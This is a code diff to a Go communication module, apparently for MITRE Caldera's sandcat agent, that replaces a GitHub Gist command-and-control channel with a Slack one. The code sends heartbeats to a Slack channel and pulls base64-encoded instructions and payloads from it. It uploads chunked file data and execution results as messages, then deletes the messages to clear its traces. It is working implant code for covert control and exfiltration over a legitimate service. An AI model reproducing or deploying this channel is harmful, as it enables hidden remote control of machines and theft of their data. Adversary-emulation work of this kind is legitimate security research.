@@ -1,7 +1,6 @@
 package contact
 
 import (
-	"context"
 	"encoding/base64"
 	"encoding/json"
 	"errors"
@@ -16,8 +15,6 @@ import (
 	"strings"
 
 	"github.com/mitre/gocat/output"
-	"github.com/google/go-github/github"
-	"golang.org/x/oauth2"
 
 )
 
@@ -25,15 +22,15 @@ const (
 	slackTimeout = 60
 	slackTimeoutResetInterval = 5
 	slackError = 500
-	beaconResponseFailThreshold = 3 // number of times to attempt fetching a beacon gist response before giving up.
-	beaconWait = 20 // number of seconds to wait for beacon gist response in case of initial failure.
-	maxDataChunkSize = 750000 // Github GIST has max file size of 1MB. Base64-encoding 786432 bytes will hit that limit
+	beaconResponseFailThreshold = 3 // number of times to attempt fetching a beacon slack response before giving up.
+	beaconWait = 10 // number of seconds to wait for beacon slack response in case of initial failure.
+	maxDataChunkSize = 750000 // Github SLACK has max file size of 1MB. Base64-encoding 786432 bytes will hit that limit
 	// todo: fix above line later
 )
 
 var (
 	token = ""
-	channel_id = ""
+	channel_id = "{SLACK_C2_CHANNEL_ID}"
 	seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
 	username string
 )
@@ -50,7 +47,7 @@ func init() {
 func (g SLACK) GetBeaconBytes(profile map[string]interface{}) []byte {
 	checkValidSleepInterval(profile)
 	var retBytes []byte
-	bites, heartbeat := gistBeacon(profile)
+	bites, heartbeat := slackBeacon(profile)
 	if heartbeat == true {
 		retBytes = bites
 	}
@@ -61,11 +58,12 @@ func (g SLACK) GetBeaconBytes(profile map[string]interface{}) []byte {
 func (g SLACK) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
 	var payloadBytes []byte
 	var err error
+	output.VerbosePrint("[+] Attempting to retrieve payload...")
 	if _, ok := profile["paw"]; !ok {
 		output.VerbosePrint("[!] Error obtaining payload - profile missing paw.")
 		return nil, ""
 	}
-	payloads := getGists("payloads", fmt.Sprintf("%s-%s", profile["paw"].(string), payloadName))
+	payloads := getSlacks("payloads", fmt.Sprintf("%s-%s", profile["paw"].(string), payloadName))
 	if payloads[0] != "" {
 		payloadBytes, err = base64.StdEncoding.DecodeString(payloads[0])
 		if err != nil {
@@ -79,11 +77,8 @@ func (g SLACK) GetPayloadBytes(profile map[string]interface{}, payloadName strin
 //C2RequirementsMet determines if sandcat can use the selected comm channel
 func (g SLACK) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
     config := make(map[string]string)
-	output.VerbosePrint(fmt.Sprintf("%s", criteria))
     if len(criteria["c2Key"]) > 0 {
-		output.VerbosePrint(fmt.Sprintf("OOGABOOGA"))
-        token = strings.Split(criteria["c2Key"], "|")[0]
-		channel_id = strings.Split(criteria["c2Key"], "|")[1]
+        token = criteria["c2Key"]
         if len(profile["paw"].(string)) == 0 {
         	config["paw"] = getBeaconNameIdentifier()
         }
@@ -100,7 +95,7 @@ func (g SLACK) SendExecutionResults(profile map[string]interface{}, result map[s
 	}
 	results := [1]map[string]interface{}{result}
 	profileCopy["results"] = results
-	gistResults(profileCopy)
+	slackResults(profileCopy)
 }
 
 func (g SLACK) GetName() string {
@@ -116,15 +111,15 @@ func (g SLACK) UploadFileBytes(profile map[string]interface{}, uploadName string
 	dataSize := len(data)
 	numChunks := int(math.Ceil(float64(dataSize) / float64(maxDataChunkSize)))
 	start := 0
-	gistName := getGistNameForUpload(paw)
+	slackName := getSlackNameForUpload(paw)
 	for i := 0; i < numChunks; i++ {
 		end := start + maxDataChunkSize
 		if end > dataSize {
 			end = dataSize
 		}
 		chunk := data[start:end]
-		gistDescription := getGistDescriptionForUpload(uploadId, encodedFilename, i+1, numChunks)
-		if err := uploadFileChunk(gistName, gistDescription, chunk); err != nil {
+		slackDescription := getSlackDescriptionForUpload(uploadId, encodedFilename, i+1, numChunks)
+		if err := uploadFileChunk(slackName, slackDescription, chunk); err != nil {
 			return err
 		}
 		start += maxDataChunkSize
@@ -132,28 +127,28 @@ func (g SLACK) UploadFileBytes(profile map[string]interface{}, uploadName string
 	return nil
 }
 
-func getGistNameForUpload(paw string) string {
-	return getGistDescriptor("upload", paw)
+func getSlackNameForUpload(paw string) string {
+	return getSlackDescriptor("upload", paw)
 }
 
-func getGistDescriptionForUpload(uploadId string, encodedFilename string, chunkNum int, totalChunks int) string {
+func getSlackDescriptionForUpload(uploadId string, encodedFilename string, chunkNum int, totalChunks int) string {
 	return fmt.Sprintf("upload:%s:%s:%d:%d", uploadId, encodedFilename, chunkNum, totalChunks)
 }
 
-func uploadFileChunk(gistName string, gistDescription string, data []byte) error {
-	if result := createSlack(gistName, gistDescription, data); result != true {
-		return errors.New(fmt.Sprintf("Failed to create file upload GIST. Response code: %s", result))
+func uploadFileChunk(slackName string, slackDescription string, data []byte) error {
+	if result := createSlack(slackName, slackDescription, data); result != true {
+		return errors.New(fmt.Sprintf("Failed to create file upload SLACK. Response code: %s", result))
 	}
 	return nil
 }
 
-func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
+func slackBeacon(profile map[string]interface{}) ([]byte, bool) {
 	failCount := 0
-	heartbeat := createHeartbeatGist("beacon", profile)
+	heartbeat := createHeartbeatSlack("beacon", profile)
 	if heartbeat {
 		//collect instructions & delete
 		for failCount < beaconResponseFailThreshold {
-			contents := getSlacks("instructions", profile["paw"].(string));
+			contents := getSlackMessages("instructions", profile["paw"].(string));
 			if contents != nil {
 				decodedContents, err := base64.StdEncoding.DecodeString(contents[0])
 				if err != nil {
@@ -162,7 +157,7 @@ func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
 				}
 				return decodedContents, heartbeat
 			}
-			// Wait for C2 server to provide instruction response gist.
+			// Wait for C2 server to provide instruction response slack.
 			time.Sleep(time.Duration(float64(beaconWait)) * time.Second)
 			failCount += 1
 		}
@@ -171,7 +166,7 @@ func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
 	return nil, heartbeat
 }
 
-func createHeartbeatGist(slackType string, profile map[string]interface{}) bool {
+func createHeartbeatSlack(slackType string, profile map[string]interface{}) bool {
 	data, err := json.Marshal(profile)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Slack heartbeat. Error with profile marshal: %s", err.Error()))
@@ -179,9 +174,9 @@ func createHeartbeatGist(slackType string, profile map[string]interface{}) bool 
 		return false
 	} else {
 		paw := profile["paw"].(string)
-		gistName := getGistDescriptor(slackType, paw)
-		gistDescription := gistName
-		if createSlack(gistName, gistDescription, data) != true {
+		slackName := getSlackDescriptor(slackType, paw)
+		slackDescription := slackName
+		if createSlack(slackName, slackDescription, data) != true {
 			output.VerbosePrint("[-] Heartbeat SLACK: FAILED")
 			return false
 		}
@@ -190,33 +185,32 @@ func createHeartbeatGist(slackType string, profile map[string]interface{}) bool 
 	return true
 }
 
-func gistResults(result map[string]interface{}) {
+func slackResults(result map[string]interface{}) {
 	data, err := json.Marshal(result)
 	if err != nil {
-		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Gist results. Error with result marshal: %s", err.Error()))
-		output.VerbosePrint("[-] Results GIST: FAILED")
+		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Slack results. Error with result marshal: %s", err.Error()))
+		output.VerbosePrint("[-] Results SLACK: FAILED")
 	} else {
 		paw := result["paw"].(string)
-		gistName := getGistDescriptor("results", paw)
-		gistDescription := gistName
-		if createSlack(gistName, gistDescription, data) != true {
-			output.VerbosePrint("[-] Results GIST: FAILED")
+		slackName := getSlackDescriptor("results", paw)
+		slackDescription := slackName
+		if createSlack(slackName, slackDescription, data) != true {
+			output.VerbosePrint("[-] Results SLACK: FAILED")
 		} else {
-			output.VerbosePrint("[+] Results GIST: SUCCESS")
+			output.VerbosePrint("[+] Results SLACK: SUCCESS")
 		}
 	}
 }
 
 
 
-func createSlack(gistName string, description string, data []byte) bool {
+func createSlack(slackName string, description string, data []byte) bool {
 	// returns false if it failed, true if success
 	stringified := base64.StdEncoding.EncodeToString(data)
-	slackText := fmt.Sprintf("%s | %s", gistName, stringified);
-	output.VerbosePrint(fmt.Sprintf("%s | %s", gistName, description));
+	slackText := fmt.Sprintf("%s | %s", slackName, stringified);
 	requestBody, err := json.Marshal(map[string]string{
-		"channel":"C022KUS0E5R",
-		"text":slackText,
+		"channel": channel_id,
+		"text": slackText,
 	})
 	
 	if err != nil {
@@ -227,16 +221,15 @@ func createSlack(gistName string, description string, data []byte) bool {
 	var result map[string]interface{}
 	json.Unmarshal(post_request("https://slack.com/api/chat.postMessage", requestBody), &result);
 
-	//output.VerbosePrint(fmt.Sprintf("%s", result["ok"]));
 	return result["ok"].(bool);
 }
 
-func getSlacks(slackType string, uniqueID string) []string {
+func getSlackMessages(slackType string, uniqueID string) []string {
 	var contents []string
 	var popog []byte
 
 	var result map[string]interface{}
-	popog = get_request(fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&oldest=%d", channel_id, time.Now().Unix()-20))
+	popog = get_request(fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&oldest=%d", channel_id, time.Now().Unix()-slackTimeout*2))
 	json.Unmarshal(popog, &result);
 
 	if result["ok"] == false {
@@ -247,14 +240,11 @@ func getSlacks(slackType string, uniqueID string) []string {
 
 	for i := range result["messages"].([]interface{}) {
 		text := result["messages"].([]interface{})[i].(map[string]interface{})["text"]
-		output.VerbosePrint(fmt.Sprintf("%s", text))
 		if strings.Index(fmt.Sprintf("%s", text), fmt.Sprintf("%s-%s", slackType, uniqueID)) == 0 {
-			output.VerbosePrint("Poggers!!!")
-			// use preview for now
-			// TODO: if larger file, actually retrieve the file download
-			
-			contents = append(contents, result["messages"].([]interface{})[i].(map[string]interface{})["files"].([]interface{})[0].(map[string]interface{})["preview"].(string))
+			// we only want the text here
 
+			contents = append(contents, strings.SplitN(fmt.Sprintf("%s", text), " | ", 2)[1])
+			
 			// now delete it
 			//s = requests.post('https://slack.com/api/chat.delete',headers={"Authorization":"Bearer %s"%(APIKEY), "charset":"utf-8"}, data={"channel":"C022KUS0E5R","ts":ts})
 			requestBody, err := json.Marshal(map[string]interface{}{
@@ -267,40 +257,74 @@ func getSlacks(slackType string, uniqueID string) []string {
 			}
 
 			//var result2 map[string]interface{}
-			output.VerbosePrint(fmt.Sprintf("%s", post_request("https://slack.com/api/chat.delete", requestBody)));
-
-
-		}
-	}
-
-
-
-	return contents
-}
-
-func getGists(gistType string, uniqueID string) []string {
-	ctx := context.Background()
-	c2Client := createNewClient()
-	var contents []string
-	gists, _, err := c2Client.Gists.List(ctx, username, nil)
-	if err == nil {
-		for _, gist := range gists {
-			if !*gist.Public && (*gist.Description == getGistDescriptor(gistType, uniqueID)) {
-				fullGist, _, err := c2Client.Gists.Get(ctx, gist.GetID())
-				if err == nil {
-					for _, file := range fullGist.Files {
-						contents = append(contents, *file.Content)
-					}
-				}
-				c2Client.Gists.Delete(ctx, fullGist.GetID())
+			if (!strings.Contains(slackType,"payloads")) {
+				post_request("https://slack.com/api/chat.delete", requestBody);
 			}
+			
+
+
 		}
 	}
+
+
+
 	return contents
 }
 
-func getGistDescriptor(gistType string, uniqueId string) string {
-	return fmt.Sprintf("%s-%s", gistType, uniqueId)
+func getSlacks(slackType string, uniqueID string) []string {
+	var contents []string
+	var url_file string
+	var popog []byte
+
+	var result map[string]interface{}
+	popog = get_request(fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&oldest=%d", channel_id, time.Now().Unix()-slackTimeout*2))
+	json.Unmarshal(popog, &result);
+
+	if result["ok"] == false {
+		// error stuff
+		output.VerbosePrint(fmt.Sprintf("[-] Failed to get slack messages: %s", popog))
+		return contents
+	}
+
+	for i := range result["messages"].([]interface{}) {
+		text := result["messages"].([]interface{})[i].(map[string]interface{})["text"]
+		if strings.Index(fmt.Sprintf("%s", text), fmt.Sprintf("%s-%s", slackType, uniqueID)) == 0 {
+			// use preview for now
+			// TODO: if larger file, actually retrieve the file download
+			
+			// contents = append(contents, result["messages"].([]interface{})[i].(map[string]interface{})["files"].([]interface{})[0].(map[string]interface{})["preview"].(string))
+			url_file = result["messages"].([]interface{})[i].(map[string]interface{})["files"].([]interface{})[0].(map[string]interface{})["url_private_download"].(string)
+			contents = append(contents, fmt.Sprintf("%s", get_request(url_file)))
+			
+			// now delete it
+			//s = requests.post('https://slack.com/api/chat.delete',headers={"Authorization":"Bearer %s"%(APIKEY), "charset":"utf-8"}, data={"channel":"C022KUS0E5R","ts":ts})
+			requestBody, err := json.Marshal(map[string]interface{}{
+				"channel":channel_id,
+				"ts":result["messages"].([]interface{})[i].(map[string]interface{})["ts"],
+			})
+			
+			if err != nil {
+				output.VerbosePrint(fmt.Sprintf("[!] Error creating requestBody: %s", err.Error()))
+			}
+
+			//var result2 map[string]interface{}
+			if (!strings.Contains(slackType,"payloads")) {
+				post_request("https://slack.com/api/chat.delete", requestBody);
+			}
+			
+
+
+		}
+	}
+
+
+
+	return contents
+}
+
+
+func getSlackDescriptor(slackType string, uniqueId string) string {
+	return fmt.Sprintf("%s-%s", slackType, uniqueId)
 }
 
 func checkValidSleepInterval(profile map[string]interface{}) {
@@ -312,16 +336,6 @@ func checkValidSleepInterval(profile map[string]interface{}) {
 func getBeaconNameIdentifier() string {
 	rand.Seed(time.Now().UnixNano())
 	return strconv.Itoa(rand.Int())
-}
-
-func createNewClient() *github.Client {
-	ctx := context.Background()
-	ts := oauth2.StaticTokenSource(
-		&oauth2.Token{AccessToken: token},
-	)
-	tc := oauth2.NewClient(ctx, ts)
-	c2Client := github.NewClient(tc)
-	return c2Client
 }
 
 func getNewUploadId() string {
@@ -355,7 +369,6 @@ func post_request(address string, data []byte) []byte {
 		output.VerbosePrint(fmt.Sprintf("[-] Failed to read HTTP response: %s", err.Error()))
 		return nil
 	}
-	output.VerbosePrint(fmt.Sprintf("%s", body));
 	return body
 }
 
@@ -381,6 +394,5 @@ func get_request(address string) []byte {
 		output.VerbosePrint(fmt.Sprintf("[-] Failed to read HTTP response: %s", err.Error()))
 		return nil
 	}
-	output.VerbosePrint(fmt.Sprintf("%s", body));
 	return body
 }
